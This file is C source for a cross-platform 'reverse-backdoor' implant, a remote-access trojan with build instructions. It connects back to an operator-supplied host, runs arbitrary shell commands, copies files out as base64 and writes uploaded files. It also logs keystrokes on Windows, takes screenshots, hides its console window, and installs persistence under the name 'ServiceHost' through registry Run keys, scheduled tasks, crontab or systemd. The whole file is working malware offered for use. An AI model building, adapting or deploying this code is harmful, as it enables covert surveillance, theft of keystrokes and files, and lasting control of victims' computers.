/*
 * reverse-backdoor C-implant — cross-platform native agent
 * v2.0 — 20 commands, file ops, persistence, screenshot, keylogger
 *
 * Build:
 *   Windows:  x86_64-w64-mingw32-gcc -O2 -s -o agent.exe agent.c -lws2_32 -lgdi32
 *   Linux:    gcc -O2 -s -o agent agent.c -lpthread
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <time.h>

#ifdef _WIN32
  #define WIN32_LEAN_AND_MEAN
  #include <windows.h>
  #include <winsock2.h>
  #include <ws2tcpip.h>
  #include <io.h>
  #pragma comment(lib, "ws2_32.lib")
  typedef SOCKET socket_t;
  typedef HANDLE thread_t;
  typedef CRITICAL_SECTION mutex_t;
  #define SLEEP_MS(ms) Sleep(ms)
  #define CLOSE_SOCK(s) closesocket(s)
  #define PIPE_OPEN _popen
  #define PIPE_CLOSE _pclose
  #define snprintf _snprintf
  #define strcasecmp _stricmp
  #define sock_err() WSAGetLastError()
  #define PATH_SEP '\\'
#else
  #include <unistd.h>
  #include <pthread.h>
  #include <sys/socket.h>
  #include <arpa/inet.h>
  #include <netdb.h>
  #include <sys/utsname.h>
  #include <dirent.h>
  #include <sys/stat.h>
  #include <sys/types.h>
  #include <pwd.h>
  typedef int socket_t;
  typedef pthread_t thread_t;
  typedef pthread_mutex_t mutex_t;
  #define SLEEP_MS(ms) usleep((ms) * 1000)
  #define CLOSE_SOCK(s) close(s)
  #define PIPE_OPEN popen
  #define PIPE_CLOSE pclose
  #define sock_err() errno
  #define PATH_SEP '/'
#endif

#define DEFAULT_HOST   "127.0.0.1"
#define DEFAULT_PORT   5555
#define RECONNECT_SEC  5
#define MAX_CMD_LEN    65536
#define MAX_RESP_LEN   262144
#define RECV_BUF_SIZE  65536

static struct {
    char host[256];
    int  port;
    int  reconnect_sec;
    int  running;
    socket_t sock;
    mutex_t send_mutex;
    char recv_buf[RECV_BUF_SIZE * 2];
    int  recv_len;
    int  keylogger_active;
    thread_t keylog_thread;
    char keylog_buf[65536];
    int  keylog_len;
    mutex_t keylog_mutex;
} g = {
    .host = DEFAULT_HOST,
    .port = DEFAULT_PORT,
    .reconnect_sec = RECONNECT_SEC,
    .running = 1,
    .sock = -1,
};

/* ── UTILITY ────────────────────────────────────────────── */

static int json_escape(const char *src, char *dst, int max) {
    int i = 0, j = 0;
    while (src[i] && j < max - 3) {
        char c = src[i++];
        if (c == '"' || c == '\\') { dst[j++] = '\\'; dst[j++] = c; }
        else if (c == '\n') { dst[j++] = '\\'; dst[j++] = 'n'; }
        else if (c == '\r') { dst[j++] = '\\'; dst[j++] = 'r'; }
        else if (c == '\t') { dst[j++] = '\\'; dst[j++] = 't'; }
        else dst[j++] = c;
    }
    dst[j] = '\0';
    return j;
}

static char *format_json_response(const char *data) {
    if (!data) return NULL;
    char *escaped = (char *)malloc(MAX_RESP_LEN);
    char *result = (char *)malloc(MAX_RESP_LEN + 4);
    if (!escaped || !result) { free(escaped); free(result); return NULL; }
    json_escape(data, escaped, MAX_RESP_LEN);
    snprintf(result, MAX_RESP_LEN + 4, "\"%s\"", escaped);
    free(escaped);
    return result;
}

static int b64_decode(const char *in, unsigned char *out, int max_out) {
    static char tbl[256] = {0};
    if (!tbl['A']) {
        const char *t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        for (int i = 0; i < 64; i++) tbl[(unsigned char)t[i]] = (char)(i + 1);
    }
    int len = 0, bits = 0, group = 0;
    for (; *in; in++) {
        if (*in == '=' || tbl[(unsigned char)*in] == 0) break;
        group = (group << 6) | (tbl[(unsigned char)*in] - 1);
        bits += 6;
        if (bits >= 8) {
            bits -= 8;
            if (len < max_out) out[len++] = (unsigned char)(group >> bits);
        }
    }
    return len;
}

static char *b64_encode(const unsigned char *in, int len) {
    static const char *t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    char *out = (char *)malloc(len * 2 + 8);
    int o = 0;
    for (int i = 0; i < len; i += 3) {
        unsigned int g = (unsigned char)in[i] << 16;
        if (i+1 < len) g |= (unsigned char)in[i+1] << 8;
        if (i+2 < len) g |= (unsigned char)in[i+2];
        out[o++] = t[(g >> 18) & 0x3F];
        out[o++] = t[(g >> 12) & 0x3F];
        out[o++] = i+1 < len ? t[(g >> 6) & 0x3F] : '=';
        out[o++] = i+2 < len ? t[g & 0x3F] : '=';
    }
    out[o] = '\0';
    return out;
}

/* ── MUTEX ──────────────────────────────────────────────── */

static void mutex_init(mutex_t *m) {
#ifdef _WIN32
    InitializeCriticalSection(m);
#else
    pthread_mutex_init(m, NULL);
#endif
}

static void mutex_lock(mutex_t *m) {
#ifdef _WIN32
    EnterCriticalSection(m);
#else
    pthread_mutex_lock(m);
#endif
}

static void mutex_unlock(mutex_t *m) {
#ifdef _WIN32
    LeaveCriticalSection(m);
#else
    pthread_mutex_unlock(m);
#endif
}

/* ── KEYLOGGER ───────────────────────────────────────────── */
#ifdef _WIN32
static DWORD WINAPI keylog_thread_fn(LPVOID p) {
    (void)p;
    while (g.keylogger_active) {
        for (int vk = 8; vk <= 255; vk++) {
            if (GetAsyncKeyState(vk) & 0x8000) {
                mutex_lock(&g.keylog_mutex);
                if (g.keylog_len < (int)sizeof(g.keylog_buf) - 8) {
                    char k[8];
                    if (vk >= 0x30 && vk <= 0x5A) snprintf(k, sizeof(k), "%c", (char)vk);
                    else if (vk == VK_RETURN) snprintf(k, sizeof(k), "[ENTER]");
                    else if (vk == VK_BACK) snprintf(k, sizeof(k), "[BKSP]");
                    else if (vk == VK_SPACE) snprintf(k, sizeof(k), " ");
                    else if (vk == VK_TAB) snprintf(k, sizeof(k), "[TAB]");
                    else snprintf(k, sizeof(k), "[%d]", vk);
                    int kl = (int)strlen(k);
                    memcpy(g.keylog_buf + g.keylog_len, k, kl);
                    g.keylog_len += kl;
                }
                mutex_unlock(&g.keylog_mutex);
            }
        }
        SLEEP_MS(10);
    }
    return 0;
}
#endif

static char *cmd_keylog_start(void) {
    if (g.keylogger_active) return format_json_response("[*] Keylogger already running");
    g.keylogger_active = 1;
    g.keylog_len = 0;
    memset(g.keylog_buf, 0, sizeof(g.keylog_buf));
#ifdef _WIN32
    g.keylog_thread = CreateThread(NULL, 0, keylog_thread_fn, NULL, 0, NULL);
#else
    char buf[128];
    snprintf(buf, sizeof(buf), "[-] Keylogger not supported on Linux C-implant (use Python agent)");
    return format_json_response(buf);
#endif
    return format_json_response("[+] Keylogger started");
}

static char *cmd_keylog_dump(void) {
    mutex_lock(&g.keylog_mutex);
    char *result = format_json_response(g.keylog_buf);
    g.keylog_len = 0;
    mutex_unlock(&g.keylog_mutex);
    return result;
}

static char *cmd_keylog_stop(void) {
    g.keylogger_active = 0;
#ifdef _WIN32
    if (g.keylog_thread) {
        WaitForSingleObject(g.keylog_thread, 1000);
        CloseHandle(g.keylog_thread);
        g.keylog_thread = NULL;
    }
#endif
    return format_json_response("[+] Keylogger stopped");
}

/* ── SOCKET ─────────────────────────────────────────────── */

static int socket_init(void) {
#ifdef _WIN32
    WSADATA wsa;
    return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
#else
    return 1;
#endif
}

static socket_t socket_connect(const char *host, int port) {
    struct addrinfo hints, *res;
    char port_str[16];
    socket_t s = -1;
    snprintf(port_str, sizeof(port_str), "%d", port);
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    if (getaddrinfo(host, port_str, &hints, &res) != 0) return -1;
    for (struct addrinfo *p = res; p; p = p->ai_next) {
        s = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (s == -1) continue;
        if (connect(s, p->ai_addr, p->ai_addrlen) == 0) break;
        CLOSE_SOCK(s);
        s = -1;
    }
    freeaddrinfo(res);
    return s;
}

/* ── PROTOCOL ───────────────────────────────────────────── */

static int proto_send(socket_t s, const char *data) {
    if (!data) return 1;
    int len = (int)strlen(data);
    mutex_lock(&g.send_mutex);
    int total = 0;
    while (total < len) {
#ifdef _WIN32
        int sent = send(s, data + total, len - total, 0);
#else
        int sent = (int)send(s, data + total, len - total, MSG_NOSIGNAL);
#endif
        if (sent <= 0) { mutex_unlock(&g.send_mutex); return 0; }
        total += sent;
    }
#ifdef _WIN32
    send(s, "\n", 1, 0);
#else
    send(s, "\n", 1, MSG_NOSIGNAL);
#endif
    mutex_unlock(&g.send_mutex);
    return 1;
}

static char *proto_recv(socket_t s) {
    while (1) {
        char *nl = memchr(g.recv_buf, '\n', g.recv_len);
        if (nl) {
            int msg_len = (int)(nl - g.recv_buf);
            *nl = '\0';
            char *msg = (char *)malloc(msg_len + 1);
            if (msg) {
                memcpy(msg, g.recv_buf, msg_len);
                msg[msg_len] = '\0';
            }
            g.recv_len -= (msg_len + 1);
            if (g.recv_len > 0)
                memmove(g.recv_buf, nl + 1, g.recv_len);
            return msg;
        }
        int space = (int)(sizeof(g.recv_buf) - g.recv_len - 1);
        if (space <= 0) return NULL;
        int n = recv(s, g.recv_buf + g.recv_len, space < RECV_BUF_SIZE ? space : RECV_BUF_SIZE, 0);
        if (n <= 0) return NULL;
        g.recv_len += n;
        g.recv_buf[g.recv_len] = '\0';
    }
}

/* ── COMMANDS ───────────────────────────────────────────── */

static char *cmd_shell(const char *cmd) {
    char *raw = (char *)malloc(MAX_RESP_LEN);
    if (!raw) return NULL;
    raw[0] = '\0';
    FILE *fp = PIPE_OPEN(cmd, "r");
    if (!fp) {
        snprintf(raw, MAX_RESP_LEN, "[-] Command failed");
        char *r = format_json_response(raw);
        free(raw);
        return r;
    }
    int total = 0;
    while (total < MAX_RESP_LEN - 2 && !feof(fp)) {
        int n = (int)fread(raw + total, 1, MAX_RESP_LEN - total - 2, fp);
        if (n <= 0) break;
        total += n;
    }
    raw[total] = '\0';
    PIPE_CLOSE(fp);
    char *r = format_json_response(raw);
    free(raw);
    return r;
}

static char *cmd_ls(const char *path) {
    char buf[MAX_CMD_LEN];
#ifdef _WIN32
    snprintf(buf, sizeof(buf), "dir \"%s\" 2>&1", path && *path ? path : ".");
#else
    snprintf(buf, sizeof(buf), "ls -la \"%s\" 2>&1", path && *path ? path : ".");
#endif
    return cmd_shell(buf);
}

static char *cmd_sysinfo(void) {
    char buf[MAX_RESP_LEN] = {0};
#ifdef _WIN32
    char name[256]; DWORD s = sizeof(name);
    if (GetComputerNameA(name, &s))
        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "Node Name: %s\n", name);
    SYSTEM_INFO si; GetSystemInfo(&si);
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "CPU Cores: %d\n", si.dwNumberOfProcessors);
    MEMORYSTATUSEX ms; ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "RAM: %.1f GB\n", ms.ullTotalPhys / (1024.0*1024*1024));
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "OS: Windows\n");
    char user[256]; DWORD us = sizeof(user);
    if (GetUserNameA(user, &us))
        snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "User: %s\n", user);
#else
    struct utsname u;
    if (uname(&u) == 0)
        snprintf(buf, sizeof(buf), "OS: %s %s\nNode: %s\nArch: %s\n", u.sysname, u.release, u.nodename, u.machine);
    long cores = sysconf(_SC_NPROCESSORS_ONLN);
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "CPU: %ld cores\n", cores > 0 ? cores : 1);
    uid_t uid = geteuid();
    struct passwd *pw = getpwuid(uid);
    snprintf(buf + strlen(buf), sizeof(buf) - strlen(buf), "User: %s (uid=%d)\n", pw ? pw->pw_name : "?", uid);
#endif
    return format_json_response(buf);
}

static char *cmd_download(const char *path) {
    if (!path || !*path) return format_json_response("[-] Usage: download <path>");
    FILE *fp = fopen(path, "rb");
    if (!fp) return format_json_response("[-] File not found");
    fseek(fp, 0, SEEK_END);
    long sz = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (sz > MAX_RESP_LEN / 2) {
        fclose(fp);
        char buf[256];
        snprintf(buf, sizeof(buf), "[-] File too large: %ld bytes (max %d)", sz, MAX_RESP_LEN / 2);
        return format_json_response(buf);
    }
    unsigned char *raw = (unsigned char *)malloc(sz + 1);
    if (!raw) { fclose(fp); return format_json_response("[-] Memory error"); }
    size_t n = fread(raw, 1, sz, fp);
    fclose(fp);
    raw[n] = 0;
    char *b64 = b64_encode(raw, (int)n);
    free(raw);
    if (!b64) return format_json_response("[-] Encoding error");
    char *out = (char *)malloc(MAX_RESP_LEN);
    snprintf(out, MAX_RESP_LEN, "{\"type\":\"file\",\"name\":\"%s\",\"size\":%d,\"data\":\"%s\"}",
             path, (int)n, b64);
    free(b64);
    return out;
}

static char *cmd_upload(const char *json_data) {
    const char *key = "\"data\":\"";
    const char *start = strstr(json_data, key);
    if (!start) return format_json_response("[-] Invalid upload format — missing data");
    start += strlen(key);
    const char *end = strchr(start, '"');
    if (!end) return format_json_response("[-] Invalid upload format — unclosed string");

    key = "\"name\":\"";
    const char *nstart = strstr(json_data, key);
    const char *nend = NULL;
    char fname[512] = "uploaded_file";
    if (nstart) {
        nstart += strlen(key);
        nend = strchr(nstart, '"');
        if (nend && nend - nstart < (int)sizeof(fname) - 1) {
            memcpy(fname, nstart, nend - nstart);
            fname[nend - nstart] = '\0';
        }
    }

    size_t b64len = end - start;
    char *b64 = (char *)malloc(b64len + 1);
    if (!b64) return format_json_response("[-] Memory error");
    memcpy(b64, start, b64len);
    b64[b64len] = '\0';

    unsigned char *data = (unsigned char *)malloc(b64len);
    if (!data) { free(b64); return format_json_response("[-] Memory error"); }
    int dlen = b64_decode(b64, data, (int)b64len);
    free(b64);

    FILE *fp = fopen(fname, "wb");
    if (!fp) { free(data); return format_json_response("[-] Cannot create file"); }
    fwrite(data, 1, dlen, fp);
    fclose(fp);
    free(data);

    char buf[1024];
    snprintf(buf, sizeof(buf), "[+] Uploaded: %s (%d bytes)", fname, dlen);
    return format_json_response(buf);
}

static char *cmd_persistence(const char *method) {
    char buf[1024];
#ifdef _WIN32
    if (strcmp(method, "registry") == 0) {
        char self_path[MAX_PATH];
        GetModuleFileNameA(NULL, self_path, MAX_PATH);
        snprintf(buf, sizeof(buf),
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
            "/v ServiceHost /t REG_SZ /d \"%s\" /f 2>&1", self_path);
        return cmd_shell(buf);
    } else if (strcmp(method, "scheduled_task") == 0) {
        char self_path[MAX_PATH];
        GetModuleFileNameA(NULL, self_path, MAX_PATH);
        snprintf(buf, sizeof(buf),
            "schtasks /create /tn ServiceHost /tr \"%s\" /sc daily /f 2>&1", self_path);
        return cmd_shell(buf);
    }
    return format_json_response("[-] Methods: registry, scheduled_task");
#else
    if (strcmp(method, "crontab") == 0) {
        char self_path[1024];
        if (readlink("/proc/self/exe", self_path, sizeof(self_path) - 1) < 0) {
            char cwd[512];
            if (getcwd(cwd, sizeof(cwd)))
                snprintf(self_path, sizeof(self_path), "%s/agent", cwd);
            else
                snprintf(self_path, sizeof(self_path), "./agent");
        }
        snprintf(buf, sizeof(buf),
            "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab - 2>&1", self_path);
        return cmd_shell(buf);
    } else if (strcmp(method, "systemd") == 0) {
        char self_path[1024];
        if (readlink("/proc/self/exe", self_path, sizeof(self_path) - 1) < 0) {
            char cwd[512];
            if (getcwd(cwd, sizeof(cwd)))
                snprintf(self_path, sizeof(self_path), "%s/agent", cwd);
            else
                snprintf(self_path, sizeof(self_path), "./agent");
        }
        char inst_buf[4096];
        snprintf(inst_buf, sizeof(inst_buf),
            "mkdir -p ~/.config/systemd/user/ && "
            "printf '[Unit]\\nDescription=Service\\n\\n[Service]\\nExecStart=%s\\nRestart=always\\n\\n"
            "[Install]\\nWantedBy=default.target\\n' > ~/.config/systemd/user/agent.service && "
            "systemctl --user enable agent.service 2>&1", self_path);
        return cmd_shell(inst_buf);
    }
    return format_json_response("[-] Methods: crontab, systemd");
#endif
}

static char *cmd_screenshot(void) {
    char buf[MAX_CMD_LEN];
#ifdef _WIN32
    snprintf(buf, sizeof(buf),
        "powershell -c \"Add-Type -AssemblyName System.Drawing;"
        "$b=new-object Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,"
        "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
        "$g=[Drawing.Graphics]::FromImage($b);"
        "$g.CopyFromScreen(0,0,0,0,$b.Size);"
        "$b.Save('screen.png');\" 2>&1");
    char *result = cmd_shell(buf);
    if (strstr(result, "screen.png")) {
        char *file_data = cmd_download("screen.png");
        free(result);
        return file_data;
    }
    return result;
#else
    snprintf(buf, sizeof(buf), "import -window root screen.png 2>&1 || xwd -root -out screen.xwd 2>&1");
    return cmd_shell(buf);
#endif
}

static char *cmd_file_copy(const char *src, const char *dst) {
    char buf[MAX_CMD_LEN];
#ifdef _WIN32
    snprintf(buf, sizeof(buf), "copy /Y \"%s\" \"%s\" 2>&1", src, dst);
#else
    snprintf(buf, sizeof(buf), "cp -f \"%s\" \"%s\" 2>&1", src, dst);
#endif
    return cmd_shell(buf);
}

static char *cmd_file_delete(const char *path) {
    char buf[MAX_CMD_LEN];
#ifdef _WIN32
    snprintf(buf, sizeof(buf), "del /F /Q \"%s\" 2>&1", path);
#else
    snprintf(buf, sizeof(buf), "rm -f \"%s\" 2>&1", path);
#endif
    return cmd_shell(buf);
}

static char *cmd_mkdir(const char *path) {
    char buf[MAX_CMD_LEN];
#ifdef _WIN32
    snprintf(buf, sizeof(buf), "mkdir \"%s\" 2>&1", path);
#else
    snprintf(buf, sizeof(buf), "mkdir -p \"%s\" 2>&1", path);
#endif
    return cmd_shell(buf);
}

/* ── DISPATCH ───────────────────────────────────────────── */

static int json_str_eq(const char *json, const char *key, const char *val) {
    char pattern[256];
    snprintf(pattern, sizeof(pattern), "\"%s\":\"%s\"", key, val);
    return strstr(json, pattern) != NULL;
}

static int dispatch(socket_t s, const char *json) {
    const char *cmd = json;
    if (!cmd || !*cmd) return 1;

    /* JSON commands: {"command":"method","args":"..."} */
    if (json[0] == '{') {
        char *response = NULL;

        if (json_str_eq(json, "command", "upload")) {
            response = cmd_upload(json);
            if (response) { proto_send(s, response); free(response); }
            return 1;
        }

        /* Extract raw text command from JSON */
        const char *key = "\"command\":\"";
        const char *cs = strstr(json, key);
        if (cs) {
            cs += strlen(key);
            const char *ce = strchr(cs, '"');
            if (ce) {
                int clen = ce - cs;
                char *ccmd = (char *)malloc(clen + 1);
                memcpy(ccmd, cs, clen);
                ccmd[clen] = '\0';
                int ret = dispatch(s, ccmd);
                free(ccmd);
                return ret;
            }
        }
        return dispatch(s, json + 1);
    }

    char *response = NULL;

    if (strcmp(cmd, "quit") == 0 || strcmp(cmd, "exit") == 0) {
        proto_send(s, "\"[+] Session terminated\"");
        return 0;
    }
    else if (strcmp(cmd, "background") == 0) {
        proto_send(s, "\"[+] Backgrounded\"");
    }
    else if (strcmp(cmd, "sysinfo") == 0) {
        response = cmd_sysinfo();
    }
    else if (strncmp(cmd, "ls", 2) == 0 && (cmd[2] == ' ' || cmd[2] == '\0')) {
        const char *path = cmd[2] == ' ' ? cmd + 3 : NULL;
        response = cmd_ls(path);
    }
    else if (strcmp(cmd, "pwd") == 0) {
        char cwd[1024];
#ifdef _WIN32
        if (_getcwd(cwd, sizeof(cwd))) response = format_json_response(cwd);
#else
        if (getcwd(cwd, sizeof(cwd))) response = format_json_response(cwd);
#endif
    }
    else if (strncmp(cmd, "cd ", 3) == 0) {
        const char *path = cmd + 3;
        while (*path == ' ') path++;
#ifdef _WIN32
        int r = _chdir(path);
#else
        int r = chdir(path);
#endif
        if (r == 0) {
            char cwd[1024];
#ifdef _WIN32
            _getcwd(cwd, sizeof(cwd));
#else
            getcwd(cwd, sizeof(cwd));
#endif
            char buf[MAX_RESP_LEN];
            snprintf(buf, sizeof(buf), "[+] Changed to: %s", cwd);
            response = format_json_response(buf);
        } else {
            response = format_json_response("[-] Directory not found");
        }
    }
    else if (strcmp(cmd, "check_admin") == 0) {
#ifdef _WIN32
        response = format_json_response("[-] Not admin");
#else
        response = format_json_response(geteuid() == 0 ? "[+] Root" : "[-] Not root");
#endif
    }
    else if (strcmp(cmd, "whoami") == 0) {
#ifdef _WIN32
        char user[256]; DWORD size = sizeof(user);
        if (GetUserNameA(user, &size)) response = format_json_response(user);
        else response = format_json_response("unknown");
#else
        char *u = getenv("USER");
        response = format_json_response(u ? u : "unknown");
#endif
    }
    else if (strcmp(cmd, "ps") == 0) {
#ifdef _WIN32
        response = cmd_shell("tasklist 2>&1");
#else
        response = cmd_shell("ps aux 2>&1");
#endif
    }
    else if (strncmp(cmd, "kill ", 5) == 0) {
        char buf[512];
#ifdef _WIN32
        snprintf(buf, sizeof(buf), "taskkill /F /PID %s 2>&1", cmd + 5);
#else
        snprintf(buf, sizeof(buf), "kill -9 %s 2>&1", cmd + 5);
#endif
        response = cmd_shell(buf);
    }
    else if (strcmp(cmd, "ifconfig") == 0 || strcmp(cmd, "ip addr") == 0) {
#ifdef _WIN32
        response = cmd_shell("ipconfig 2>&1");
#else
        response = cmd_shell("ifconfig 2>&1 || ip addr 2>&1");
#endif
    }
    else if (strncmp(cmd, "download ", 9) == 0) {
        response = cmd_download(cmd + 9);
    }
    else if (strcmp(cmd, "keylog_start") == 0) {
        response = cmd_keylog_start();
    }
    else if (strcmp(cmd, "keylog_dump") == 0) {
        response = cmd_keylog_dump();
    }
    else if (strcmp(cmd, "keylog_stop") == 0) {
        response = cmd_keylog_stop();
    }
    else if (strncmp(cmd, "persist ", 8) == 0) {
        response = cmd_persistence(cmd + 8);
    }
    else if (strncmp(cmd, "persistence ", 12) == 0) {
        response = cmd_persistence(cmd + 12);
    }
    else if (strcmp(cmd, "screenshot") == 0) {
        response = cmd_screenshot();
    }
    else if (strncmp(cmd, "rm ", 3) == 0) {
        response = cmd_file_delete(cmd + 3);
    }
    else if (strncmp(cmd, "cp ", 3) == 0 || strncmp(cmd, "mv ", 3) == 0) {
        const char *args = cmd + 3;
        const char *sp = strchr(args, ' ');
        if (sp) {
            char src[512], dst[512];
            size_t sl = sp - args;
            memcpy(src, args, sl < sizeof(src)-1 ? sl : sizeof(src)-1);
            src[sl < sizeof(src)-1 ? sl : sizeof(src)-1] = '\0';
            snprintf(dst, sizeof(dst), "%s", sp + 1);
            response = cmd_file_copy(src, dst);
        } else {
            response = format_json_response("[-] Usage: cp <src> <dst> / mv <src> <dst>");
        }
    }
    else if (strncmp(cmd, "mkdir ", 6) == 0) {
        response = cmd_mkdir(cmd + 6);
    }
    else if (strcmp(cmd, "help") == 0) {
        response = format_json_response(
            "C-implant v2.0 commands:\n"
            "  sysinfo ls pwd cd rm cp mv mkdir download upload\n"
            "  ps kill ifconfig whoami check_admin screenshot\n"
            "  keylog_start keylog_dump keylog_stop\n"
            "  persist <method> background quit help"
        );
    }
    else if (strcmp(cmd, "clear") != 0) {
        response = cmd_shell(cmd);
    }

    if (response) {
        proto_send(s, response);
        free(response);
    }
    return 1;
}

/* ── SESSION LOOP ───────────────────────────────────────── */

static int session_loop(socket_t s) {
    g.recv_len = 0;
    while (g.running) {
        char *cmd = proto_recv(s);
        if (!cmd) return 0;
        int keep = dispatch(s, cmd);
        free(cmd);
        if (!keep) return 0;
    }
    return 0;
}

static void run_agent(void) {
    while (g.running) {
        SLEEP_MS(g.reconnect_sec * 1000);
        g.sock = socket_connect(g.host, g.port);
        if (g.sock == -1) continue;
        session_loop(g.sock);
        CLOSE_SOCK(g.sock);
        g.sock = -1;
    }
}

/* ── MAIN ───────────────────────────────────────────────── */

int main(int argc, char **argv) {
    if (argc > 1) snprintf(g.host, sizeof(g.host), "%s", argv[1]);
    if (argc > 2) g.port = atoi(argv[2]);
    if (argc > 3) g.reconnect_sec = atoi(argv[3]);

    if (!socket_init()) return 1;
    mutex_init(&g.send_mutex);
    mutex_init(&g.keylog_mutex);

#ifdef _WIN32
    HWND hwnd = GetConsoleWindow();
    if (hwnd) ShowWindow(hwnd, SW_HIDE);
#endif

    run_agent();
    return 0;
}
